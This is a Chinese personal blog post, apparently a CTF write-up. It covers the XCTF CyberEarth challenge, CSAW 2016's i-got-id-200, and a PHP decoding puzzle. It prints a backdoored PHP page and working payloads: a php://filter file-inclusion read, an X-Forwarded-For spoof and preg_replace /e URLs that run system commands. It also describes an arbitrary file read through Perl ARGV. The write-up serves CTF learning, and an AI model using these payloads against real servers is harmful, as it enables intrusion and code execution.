@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>XCTF 4th-CyberEarth | Yyx</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://www.yyxyy.xyz//favicon.ico?v=1622952381444">
+<link rel="stylesheet" href="https://www.yyxyy.xyz//styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统
+题目描述中有后门，于是想到可能会读取源码，试了试文件泄露，无果。
+查看源代码发现了?page=index.php
+于是想到了文件包含，试了试果然有。
+index.php?page=p..." />
+    <meta name="keywords" content="ctf" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://www.yyxyy.xyz/">
+        <img src="https://www.yyxyy.xyz//images/avatar.png?v=1622952381444" class="site-logo">
+        <h1 class="site-title">Yyx</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      记得在这杂乱的生活里，带点微笑
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://www.yyxyy.xyz//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">XCTF 4th-CyberEarth</h2>
+            <div class="post-date">2021-06-06</div>
+            
+            <div class="post-content" v-pre>
+              <h5 id="其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统">其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</h5>
+<p>题目描述中有后门，于是想到可能会读取源码，试了试文件泄露，无果。</p>
+<p><em><strong>查看源代码发现了?page=index.php</strong></em></p>
+<p>于是想到了文件包含，试了试果然有。</p>
+<p><em><strong>index.php?page=php://filter/read=convert.base64-encode/resource=index.php</strong></em></p>
+<p>index.php源码：</p>
+<pre><code class="language-php+HTML">&lt;?php
+error_reporting(0);
+@session_start();
+posix_setuid(1000);
+?&gt;
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot; media=&quot;all&quot;&gt;
+    &lt;title&gt;设备维护中心&lt;/title&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;ul class=&quot;layui-nav&quot;&gt;
+        &lt;li class=&quot;layui-nav-item layui-this&quot;&gt;&lt;a href=&quot;?page=index&quot;&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+    &lt;fieldset class=&quot;layui-elem-field layui-field-title&quot; style=&quot;margin-top: 30px;&quot;&gt;
+        &lt;legend&gt;设备列表&lt;/legend&gt;
+    &lt;/fieldset&gt;
+    &lt;table class=&quot;layui-hide&quot; id=&quot;test&quot;&gt;&lt;/table&gt;
+    &lt;script type=&quot;text/html&quot; id=&quot;switchTpl&quot;&gt;
+        &lt;!-- 这里的 checked 的状态只是演示 --&gt;
+        &lt;input type=&quot;checkbox&quot; name=&quot;sex&quot; value=&quot;{{d.id}}&quot; lay-skin=&quot;switch&quot; lay-text=&quot;开|关&quot; lay-filter=&quot;checkDemo&quot; {{ d.id==1 0003 ? 'checked' : '' }}&gt;
+    &lt;/script&gt;
+    &lt;script src=&quot;layui/layui.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+    layui.use('table', function() {
+        var table = layui.table,
+            form = layui.form;
+
+        table.render({
+            elem: '#test',
+            url: '/somrthing.json',
+            cellMinWidth: 80,
+            cols: [
+                [
+                    { type: 'numbers' },
+                     { type: 'checkbox' },
+                     { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
+                     { field: 'name', title: '设备名', templet: '#nameTpl' },
+                     { field: 'area', title: '区域' },
+                     { field: 'status', title: '维护状态', minWidth: 120, sort: true },
+                     { field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true }
+                ]
+            ],
+            page: true
+        });
+    });
+    &lt;/script&gt;
+    &lt;script&gt;
+    layui.use('element', function() {
+        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
+        //监听导航点击
+        element.on('nav(demo)', function(elem) {
+            //console.log(elem)
+            layer.msg(elem.text());
+        });
+    });
+    &lt;/script&gt;
+&lt;?php
+$page = $_GET[page];
+if (isset($page)) {
+if (ctype_alnum($page)) {
+?&gt;
+    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
+    &lt;div style=&quot;text-align:center&quot;&gt;
+        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;
+    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;?php
+}else{
+
+?&gt;
+        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
+        &lt;div style=&quot;text-align:center&quot;&gt;
+            &lt;p class=&quot;lead&quot;&gt;
+                &lt;?php
+
+                if (strpos($page, 'input') &gt; 0) {
+                    die();
+                }
+
+                if (strpos($page, 'ta:text') &gt; 0) {
+                    die();
+                }
+
+                if (strpos($page, 'text') &gt; 0) {
+                    die();
+                }
+
+                if ($page === 'index.php') {
+                    die('Ok');
+                }
+                    include($page);
+                    die();
+                ?&gt;
+        &lt;/p&gt;
+        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
+
+&lt;?php
+}}
+//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
+
+if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
+
+    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;
+
+    $pattern = $_GET[pat];
+    $replacement = $_GET[rep];
+    $subject = $_GET[sub];
+
+    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {
+        preg_replace($pattern, $replacement, $subject);
+    }else{
+        die();
+    }
+}
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<p>发现后门</p>
+<pre><code class="language-php">if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
+
+    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;
+
+    $pattern = $_GET[pat];
+    $replacement = $_GET[rep];
+    $subject = $_GET[sub];
+
+    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {
+        preg_replace($pattern, $replacement, $subject);
+    }else{
+        die();
+    }
+}
+//利用就是replace的pattern后面如果有/e的话,replacement的语句是会得到执行的
+//参考链接：https://www.cnblogs.com/dhsx/p/4991983.html
+</code></pre>
+<p>后面操作就很常规：</p>
+<ol>
+<li>改xff头为127.0.0.1</li>
+<li>列目录 /index.php?pat=/test/e&amp;rep=system('ls')&amp;sub=test</li>
+<li>然后发现一个s3chahahaDir/flag/flag.php</li>
+<li>打开php文件 pat=/test/e&amp;rep=system('cat%20s3chahahaDir/flag/flag.php')&amp;sub=test 查看源码有flag</li>
+<li>或者这样 show_source('s3chahahaDir/flag/flag.php')</li>
+</ol>
+<hr>
+<h4 id="i-got-id-200">i-got-id-200</h4>
+<h5 id="csaw-ctf-2016-quals">csaw-ctf-2016-quals</h5>
+<p>进入网站有两个功能点，主要看文件上传那个功能点。</p>
+<p>我们上传文件会被打印出来，想了很久没想通，看了<a href="https://tsublogs.wordpress.com/2016/09/18/606/">大佬博客</a></p>
+<p>大佬猜出了大概代码</p>
+<pre><code class="language-perl">use strict;
+use warnings;
+use CGI;
+ 
+my $cgi= CGI-&gt;new;
+if ( $cgi-&gt;upload( 'file' ) )
+{
+my $file= $cgi-&gt;param( 'file' );
+while ( &lt;$file&gt; ) { print &quot;$_&quot;; } }
+</code></pre>
+<p><a href="https://github.com/73696e65/ctf-notes/blob/master/2016-ctf.csaw.io/web-200-i_got_id.md">另一个大佬博客</a></p>
+<p>大概思路，自己也不是太懂2333.</p>
+<p>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。</p>
+<p>读文件时，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。</p>
+<p>利用方法：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。</p>
+<h4 id="解密">解密</h4>
+<p>加密脚本</p>
+<pre><code class="language-php">&lt;?php
+$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
+
+function encode($str){
+    $_o=strrev($str);
+    // echo $_o;
+        
+    for($_0=0;$_0&lt;strlen($_o);$_0++){
+       
+        $_c=substr($_o,$_0,1);
+        $__=ord($_c)+1;
+        $_c=chr($__);
+        $_=$_.$_c;   
+    } 
+    return str_rot13(strrev(base64_encode($_)));
+}
+
+highlight_file(__FILE__);
+/*
+   逆向加密算法，解密$miwen就是flag
+*/
+?&gt; 
+</code></pre>
+<p>解密脚本</p>
+<pre><code class="language-python">import base64
+import string
+#rot13解密
+upperdict = {}
+lowerdict = {}
+upperletters = string.ascii_uppercase
+lowerletters = string.ascii_lowercase
+
+dststr = []
+oristr = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;
+
+for i in range(0, len(lowerletters)):
+    if i &lt; 13:
+        lowerdict[lowerletters[i]] = lowerletters[i + 13]
+    else:
+        lowerdict[lowerletters[i]] = lowerletters[i - 13]
+
+for i in range(0, len(upperletters)):
+    if i &lt; 13:
+        lowerdict[upperletters[i]] = upperletters[i + 13]
+    else:
+        lowerdict[upperletters[i]] = upperletters[i - 13]
+
+for ch in oristr:
+    if ch in lowerdict:
+        dststr.append(lowerdict[ch])
+    elif ch in upperdict:
+        dststr.append(upperdict[ch])
+    else:
+        dststr.append(ch)
+dststr = ''.join(dststr)
+dststr=dststr[::-1]#翻转
+dststr=base64.b64decode(dststr.encode('utf-8'))#base64解密
+mingwen=&quot;&quot; #逆写加密过程
+for i in range(len(dststr)):
+    d=dststr[i:i+1]
+    c=ord(d)-1
+    mingwen=mingwen+chr(c)
+print(mingwen[::-1])
+
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://www.yyxyy.xyz/tag/6ggTDlhai/" class="tag">
+                    ctf
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://www.yyxyy.xyz/post/easy-an-heng-12-yue-yue-sai/">
+                  <h3 class="post-title">
+                    easy-安恒12月月赛
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
